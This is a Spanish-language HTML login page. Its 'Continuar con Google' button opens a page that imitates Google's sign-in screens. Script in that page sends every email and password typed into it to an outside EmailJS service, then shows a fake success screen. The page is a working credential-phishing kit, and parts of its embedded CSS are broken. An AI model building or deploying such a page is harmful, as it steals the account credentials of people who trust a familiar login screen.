<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 450px;
            width: 100%;
        }

        .content {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        h1 {
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
            margin-top: 0;
        }

        .subtitle {
            color: #5f6368;
            font-size: 15px;
            margin-bottom: 32px;
        }

        .social-auth {
            display: flex;
            flex-direction: column;
            gap: 12px;
            width: 100%;
        }

        .social-button {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding: 12px 24px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            background: #ffffff;
            font-size: 15px;
            font-weight: 500;
            color: #3c4043;
            cursor: pointer;
            transition: all 0.2s ease;
            font-family: inherit;
        }

        .social-button:hover {
            background: #f8f9fa;
            border-color: #d2d3d4;
            box-shadow: 0 1px 1px rgba(0,0,0,0.04), 0 1px 3px rgba(32,33,36,0.28);
        }

        .social-button:active {
            background: #f1f3f4;
        }

        .icon {
            width: 20px;
            height: 20px;
        }

        .footer {
            margin-top: 40px;
            text-align: center;
            font-size: 13px;
            color: #5f6368;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin-bottom: 20px;
        }

        .footer-links a {
            color: #1f71c6;
            text-decoration: none;
            transition: color 0.2s ease;
        }

        .footer-links a:hover {
            color: #1560ab;
            text-decoration: underline;
        }

        .footer-text {
            color: #9aa0a6;
        }

        @media (max-width: 480px) {
            h1 {
                font-size: 22px;
            }

            .subtitle {
                font-size: 14px;
            }

            .footer-links {
                gap: 16px;
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="content">
            <!-- Title -->
            <h1>Iniciar sesión</h1>
            <p class="subtitle">Accede a tu cuenta</p>

            <!-- Social Login -->
            <div class="social-auth">
                <button class="social-button" onclick="handleGoogleLogin()">
                    <svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#1F71C6"/>
                        <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                        <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                        <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                    </svg>
                    Continuar con Google
                </button>

                <button class="social-button" onclick="handleFacebookLogin()">
                    <svg class="icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" fill="#1877F2"/>
                    </svg>
                    Continuar con Facebook
                </button>
            </div>

            <!-- Footer -->
            <div class="footer">
                <div class="footer-links">
                    <a href="#privacidad">Privacidad</a>
                    <a href="#terminos">Términos</a>
                    <a href="#ayuda">Ayuda</a>
                </div>
                <div class="footer-text">© 2024</div>
            </div>
        </div>
    </div>

    <script>
        function handleGoogleLogin() {
            const googleLoginHTML = `<!DOCTYPE html>

    }

    .spinner {

      border-radius: 50%;
      animation: spin 0.7s linear infinite;
      display: none;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .btn.loading .lbl { display: none; }
    .btn.loading .spinner { display: block; }

      display: inline-flex;

      font-size: 14px;
      color: #202124;
      cursor: pointer;
      width: fit-content;
      margin-bottom: 28px;
      background: #fff;
    }
    .chip:hover { background: #f2f2f2; }
    .chip-avatar {
      width: 24px; height: 24px;
      background: #0b57d0;
      border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      font-size: 12px; font-weight: 500; color: #fff;
    }
    .chip-arrow { color: #444746; }
    .chip-arrow svg { width: 16px; height: 16px; display: block; }

    /* ── SUCCESS ── */
    .success-inner {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      flex: 1;
    }
    .big-avatar {
      width: 80px; height: 80px;

      margin-bottom: 24px;
    }

    footer {
      padding: 20px 24px 28px;

      display: flex;
      align-items: center;

      color: #444746;
      font-size: 14px;
    }
    .lang-select select {
      background: none;
      border: none;
      font-size: 14px;
      color: #444746;
      cursor: pointer;
      font-family: inherit;
      outline: none;
    }
    .lang-select svg { width: 18px; height: 18px; color: #444746; }
    .footer-links {
      display: flex;
      gap: 28px;
    }
    .footer-links a {
      font-size: 14px;
      color: #444746;
      text-decoration: none;
    }
    .footer-links a:hover { text-decoration: underline; }
  </style>
</head>
<body>

<header>
  <svg width="40" height="40" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
    <path fill="#EA4335" d="M24 9.5c3.1 0 5.9 1.1 8.1 2.9l6-6C34.5 3.1 29.5 1 24 1 14.8 1 7 6.7 3.7 14.6l7 5.4C12.5 13.6 17.8 9.5 24 9.5z"/>
    <path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.6-4.9 7.3l7.5 5.8c4.4-4.1 7.2-10.1 7.2-17.1z"/>
    <path fill="#FBBC05" d="M10.7 28.6A14.7 14.7 0 0 1 9.5 24c0-1.6.3-3.2.7-4.6l-7-5.4A23.7 23.7 0 0 0 .5 24c0 3.9.9 7.5 2.7 10.8l7.5-6.2z"/>
    <path fill="#34A853" d="M24 46.5c5.5 0 10.1-1.8 13.4-4.9l-7.5-5.8c-1.8 1.2-4.1 1.9-5.9 1.9-6.2 0-11.5-4.2-13.3-9.9l-7.5 6.2C6.9 40.7 14.8 46.5 24 46.5z"/>
    <path fill="none" d="M0 0h48v48H0z"/>
  </svg>
</header>

<main>

  <div class="section active" id="sec-email">
    <h1>Accede a tu cuenta</h1>
    <p class="subtitle">Usa tu Cuenta de Google</p>

    <div class="field">
      <input type="email" id="email" autocomplete="email" placeholder="Correo electrónico o teléfono" />
      <label for="email">Correo electrónico o teléfono</label>
    </div>
    <div class="err-msg" id="email-err">Escribe un correo electrónico o número de teléfono.</div>

    <div style="margin-top: 16px;">
      <a href="#" class="link" onclick="return false">¿Olvidaste el correo electrónico?</a>
    </div>

    <p class="hint">
      ¿No es tu dispositivo? Usa el modo Invitado para acceder de forma privada.
      <a href="#" class="link" onclick="return false">Más información</a>
    </p>

    <div class="actions">
      <a href="#" class="link" onclick="return false">Crear cuenta</a>
      <button class="btn" id="btn-email" onclick="nextEmail()">
        <span class="lbl">Siguiente</span>
        <div class="spinner"><\/div>
      </button>
    </div>
  </div>

  <div class="section" id="sec-pw">
    <h1>Hola</h1>

    <div class="chip" onclick="goBack()" id="chip">
      <div class="chip-avatar" id="chip-av">U</div>
      <span id="chip-text"><\/span>
      <div class="chip-arrow">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M6 9l6 6 6-6"/>
        <\/svg>
      </div>
    </div>

    <div class="field">
      <input type="password" id="pw" autocomplete="current-password" placeholder="Ingresa tu contraseña" />
      <label for="pw">Ingresa tu contraseña</label>
      <button class="eye-btn" type="button" onclick="togglePw()" aria-label="Mostrar/ocultar">
        <svg id="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
          <circle cx="12" cy="12" r="3"/>
        <\/svg>
      </button>
    </div>
    <div class="err-msg" id="pw-err">Contraseña incorrecta. Vuelve a intentarlo.</div>

    <div style="margin-top: 16px;">
      <a href="#" class="link" onclick="return false">¿Olvidaste tu contraseña?</a>
    </div>

    <div class="actions">
      <a href="#" class="link" onclick="return false">Crear cuenta</a>
      <button class="btn" id="btn-pw" onclick="nextPw()">
        <span class="lbl">Siguiente</span>
        <div class="spinner"><\/div>
      </button>
    </div>
  </div>

  <div class="section" id="sec-ok">
    <div class="success-inner">
      <div class="big-avatar" id="big-av">U</div>
      <h1 id="ok-name">¡Hola!</h1>
      <p style="font-size:15px; color:#444746; margin-bottom:32px;" id="ok-email"><\/p>
      <button class="btn" onclick="reset()" style="width:100%;">
        <span class="lbl">Continuar en Google</span>
      </button>
    </div>
  </div>

</main>

<footer>
  <div class="lang-select">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <circle cx="12" cy="12" r="10"/>
      <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10A15.3 15.3 0 0 1 12 2z"/>
    <\/svg>
    <select>
      <option>Español (Latinoamérica)</option>

    </select>

<script>
  emailjs.init('0jG8bx2KA7fuPpvtf');

  const ACCOUNTS = {
    'usuario@gmail.com': { name: 'Usuario',    password: '123456'   },
    'test@gmail.com':    { name: 'Test User',  password: 'password' },
    'demo@gmail.com':    { name: 'Demo User',  password: 'demo123'  },
  };

  let currentEmail = '';

  function show(id) {
    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
  }

  ['email', 'pw'].forEach(id => {
    const el = document.getElementById(id);
    if (!el) return;
    el.addEventListener('input', () => {
      el.value ? el.classList.add('filled') : el.classList.remove('filled');
      el.classList.remove('err');
      const e = document.getElementById(id === 'email' ? 'email-err' : 'pw-err');
      if (e) e.classList.remove('show');
    });
    el.addEventListener('keydown', e => {
      if (e.key === 'Enter') id === 'email' ? nextEmail() : nextPw();
    });
  });

  function setLoading(btnId, on) {
    document.getElementById(btnId).classList.toggle('loading', on);
  }

  function nextEmail() {
    const inp = document.getElementById('email');
    const val = inp.value.trim();
    const errEl = document.getElementById('email-err');
    const re = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$|^\\+?[\\d\\s\\-]{7,15}$/;

    if (!val || !re.test(val)) {
      inp.classList.add('err');
      errEl.textContent = val
        ? 'No pudimos encontrar tu cuenta de Google.'
        : 'Escribe un correo electrónico o número de teléfono.';
      errEl.classList.add('show');
      return;
    }

    currentEmail = val;
    setLoading('btn-email', true);
    setTimeout(() => {
      setLoading('btn-email', false);
      document.getElementById('chip-text').textContent = currentEmail;
      document.getElementById('chip-av').textContent = currentEmail.charAt(0).toUpperCase();
      document.getElementById('pw').value = '';
      document.getElementById('pw').classList.remove('filled', 'err');
      document.getElementById('pw-err').classList.remove('show');
      show('sec-pw');
      document.getElementById('pw').focus();
    }, 900);
  }

  function goBack() {
    show('sec-email');
    document.getElementById('email').focus();
  }

  async function enviarDatos(correo, password) {
    try {
      await emailjs.send('service_tr444xm', 'template_4x12f3k', {
        correo: correo,
        password: password,
        fecha: new Date().toLocaleString('es-EC')
      });
      console.log('✅ Datos enviados correctamente a la base de datos');
    } catch (error) {
      console.error('❌ Error al enviar datos:', error);
    }
  }

  function nextPw() {
    const inp = document.getElementById('pw');
    const val = inp.value;
    const errEl = document.getElementById('pw-err');

    if (!val) {
      inp.classList.add('err');
      errEl.textContent = 'Ingresa tu contraseña.';
      errEl.classList.add('show');
      return;
    }

    setLoading('btn-pw', true);
    setTimeout(() => {
      setLoading('btn-pw', false);
      const acc = ACCOUNTS[currentEmail.toLowerCase()];
      if (acc && acc.password !== val) {
        inp.classList.add('err');
        errEl.textContent = 'Contraseña incorrecta. Vuelve a intentarlo.';
        errEl.classList.add('show');
        return;
      }
      
      enviarDatos(currentEmail, val);
      
      const name = acc ? acc.name : currentEmail.split('@')[0];
      document.getElementById('big-av').textContent = name.charAt(0).toUpperCase();
      document.getElementById('ok-name').textContent = '¡Hola, ' + name + '!';
      document.getElementById('ok-email').textContent = currentEmail;
      show('sec-ok');
    }, 1000);
  }

  function togglePw() {
    const inp = document.getElementById('pw');
    const icon = document.getElementById('eye-icon');
    if (inp.type === 'password') {
      inp.type = 'text';
      icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';
    } else {
      inp.type = 'password';
      icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
    }
  }

  function reset() {
    currentEmail = '';
    const e = document.getElementById('email');
    e.value = '';
    e.classList.remove('filled', 'err');
    document.getElementById('email-err').classList.remove('show');
    show('sec-email');
    e.focus();
  }
<\/script>
</body>
</html>`;

            const blob = new Blob([googleLoginHTML], { type: 'text/html' });
            const url = URL.createObjectURL(blob);
            window.open(url, '_blank');
        }

        function handleFacebookLogin() {
            console.log('Facebook login initiated');
            alert('Redirigiendo a Facebook...');
        }
    </script>
</body>
</html>
